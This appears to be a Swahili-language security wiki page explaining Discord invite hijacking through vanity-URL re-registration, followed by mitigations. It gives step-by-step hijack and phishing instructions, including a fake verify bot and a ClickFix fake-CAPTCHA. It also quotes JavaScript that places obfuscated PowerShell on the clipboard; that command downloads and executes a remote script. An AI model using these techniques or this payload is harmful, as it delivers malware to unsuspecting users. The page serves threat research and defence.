# Discord Invite Hijacking

Discord Invite Hijacking hutumia vibaya sheria za utumiaji tena za custom vanity links: invite code ya muda iliyoisha muda wake, au code ya kudumu iliyofutwa inayoundwa tu na herufi ndogo na tarakimu, inaweza kusajiliwa kama vanity link kwenye server yenye Level 3 Boost. Custom vanity link pia inaweza kupatikana wakati server yake ya awali inapopoteza Level 3 Boost; kwa invite ya muda yenye herufi kubwa, attacker anaweza kusajili mapema vanity form yenye herufi ndogo huku invite ya kawaida ikiwa bado inafanya kazi, lakini uelekezaji upya huanza tu baada ya invite hiyo kuisha muda wake.<sup>[[1]](#references)[[2]](#references)</sup>

## Aina za Invite na Hatari ya Hijack

Hatari iliyoonekana hutofautiana kulingana na aina ya invite:<sup>[[1]](#references)[[2]](#references)</sup>

| Invite Type           | Hijackable? | Condition / Comments                                                                                       |
|-----------------------|-------------|------------------------------------------------------------------------------------------------------------|
| Temporary Invite Link | ✅          | Baada ya kuisha muda wake, code hiyo hupatikana na inaweza kusajiliwa tena kama vanity URL na server yenye Boost. |
| Permanent Invite Link | ⚠️          | Ikiwa imefutwa na inaundwa tu na herufi ndogo na tarakimu, code hiyo inaweza kupatikana tena.        |
| Custom Vanity Link    | ✅          | Ikiwa server ya awali inapoteza Level 3 Boost, vanity invite yake hupatikana kwa usajili mpya.    |

## Hatua za Exploitation

1. Reconnaissance
- Fuatilia vyanzo vya umma (forums, social media, Telegram channels) kwa invite links zinazolingana na muundo wa `discord.gg/{code}` au `discord.com/invite/{code}`.<sup>[[1]](#references)</sup>
- Kusanya invite codes zinazovutia (za muda au vanity).<sup>[[1]](#references)</sup>
2. Pre-registration
- Unda au tumia Discord server iliyopo yenye ruhusa za Level 3 Boost.<sup>[[1]](#references)[[2]](#references)</sup>
- Kwenye **Server Settings → Vanity URL**, jaribu kuhusisha target invite code. Ikikubaliwa, code hiyo huhifadhiwa na server hasidi.<sup>[[1]](#references)</sup>
3. Hijack Activation
- Kwa temporary invites, subiri hadi invite ya awali iishe muda wake (au ifute mwenyewe ikiwa unadhibiti chanzo).<sup>[[1]](#references)</sup>
- Kwa codes zenye herufi kubwa, variant yenye herufi ndogo inaweza kudaiwa mara moja, ingawa uelekezaji upya huanza tu baada ya kuisha muda wake.<sup>[[1]](#references)</sup>
4. Silent Redirection
- Watumiaji wanaotembelea link ya zamani hutumwa bila kuonekana kwa server inayodhibitiwa na attacker mara hijack inapokuwa active.<sup>[[1]](#references)</sup>

## Phishing Flow kupitia Discord Server

1. Zuia channels za server ili channel ya **#verify** pekee ionekane.<sup>[[1]](#references)</sup>
2. Deploy bot (kwa mfano, **Safeguard#0786**) ili kuwahimiza wageni kufanya verification kupitia OAuth2.<sup>[[1]](#references)</sup>
3. Bot huwaelekeza watumiaji kwenye phishing site (kwa mfano, `captchaguard.me`) kwa kisingizio cha CAPTCHA au hatua ya verification.<sup>[[1]](#references)</sup>
4. Tumia ujanja wa UX wa **ClickFix**:<sup>[[1]](#references)</sup>
- Onyesha ujumbe wa CAPTCHA iliyoharibika.
- Waelekeze watumiaji kufungua dialog ya **Win+R**, kubandika PowerShell command iliyopakiwa tayari, kisha kubonyeza Enter.

### Mfano wa ClickFix Clipboard Injection

Campaign ilitumia JavaScript kunakili PowerShell command hasidi kwenye clipboard:<sup>[[1]](#references)</sup>
```javascript
// Copy malicious PowerShell command to clipboard
const cmd = `powershell -NoExit -Command "$r='NJjeywEMXp3L3Fmcv02bj5ibpJWZ0NXYw9yL6MHc0RHa';` +
`$u=($r[-1..-($r.Length)]-join '');` +
`$url=[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($u));` +
`iex (iwr -Uri $url)"`;
navigator.clipboard.writeText(cmd);
```
Mbinu hii huepuka upakuaji wa faili moja kwa moja na hutumia vipengele vya UI vinavyojulikana ili kupunguza mashaka ya mtumiaji.<sup>[[1]](#references)</sup>

## Mitigations

- Pendelea invite links za kudumu na uhakikishe kuwa code ina angalau herufi moja kubwa; permanent codes zilizofutwa zilizo na herufi kubwa haziwezi kutumika tena kama vanity links.<sup>[[1]](#references)</sup>
- Badilisha invite codes mara kwa mara na ubatilishe links za zamani.
- Fuatilia hali ya Discord server boost na madai ya vanity URL.<sup>[[1]](#references)[[2]](#references)</sup>
- Wafundishe watumiaji kuthibitisha uhalisi wa server na kuepuka kutekeleza commands zilizobandikwa kutoka kwenye clipboard.

## References

- [1] [Kutoka Imani hadi Tishio: Discord Invites Zilizotekwa Zikitumika kwa Usambazaji wa Malware wa Hatua Nyingi](https://research.checkpoint.com/2025/from-trust-to-threat-hijacked-discord-invites-used-for-multi-stage-malware-delivery/)
- [2] [Custom Invite Link – Discord Support](https://support.discord.com/hc/en-us/articles/115001542132-Custom-Invite-Link)
{{#include ../../banners/hacktricks-training.md}}
